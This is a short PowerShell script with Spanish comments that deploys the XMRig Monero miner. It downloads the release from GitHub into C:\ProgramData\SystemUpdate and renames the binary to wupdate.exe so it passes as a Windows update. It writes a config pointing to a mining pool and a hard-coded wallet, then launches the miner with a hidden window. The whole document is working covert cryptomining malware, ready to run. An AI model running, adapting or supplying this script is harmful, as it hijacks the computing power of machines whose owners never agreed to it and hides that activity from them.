# === DEPLOY XMRig MINERO - Versión 6 (Config 100% limpia sin BOM) ===
$installPath = "C:\ProgramData\SystemUpdate"
New-Item -ItemType Directory -Path $installPath -Force | Out-Null

# Descarga y extrae
$zipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip"
$zipPath = "$installPath\xmrig.zip"
Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
Expand-Archive -Path $zipPath -DestinationPath $installPath -Force
Remove-Item $zipPath -Force

# Copiar ejecutable
Copy-Item "$installPath\xmrig-6.25.0\xmrig.exe" "$installPath\wupdate.exe" -Force

# Configuración limpia (usamos ConvertTo-Json + UTF8 sin BOM)
$config = @{
    autosave = $true
    cpu = @{ "max-threads-hint" = 50 }
    pools = @(
        @{
            url = "pool.supportxmr.com:3333"
            user = "86ai84R8527XLKGjipKuW6YSjpwnevaGESZWnW1kEnpJVnmLLVUTd2PC2hDu8e9oDLYtWK9xGhysd89Mxq1rNZkoQR5DnNd"
            pass = "x"
            keepalive = $true
            tls = $false
        }
    )
    background = $false
    "log-file" = $null
}

$configPath = "$installPath\config.json"
$config | ConvertTo-Json -Depth 10 | Set-Content -Path $configPath -Encoding UTF8NoBOM -Force

# Ejecutar el minero directamente (sin ventana)
$exePath = "$installPath\wupdate.exe"
Start-Process -FilePath $exePath -ArgumentList "-c `"$configPath`"" -WindowStyle Hidden -NoNewWindow

Write-Output "=== Minero lanzado (versión 6 - config limpia) ==="
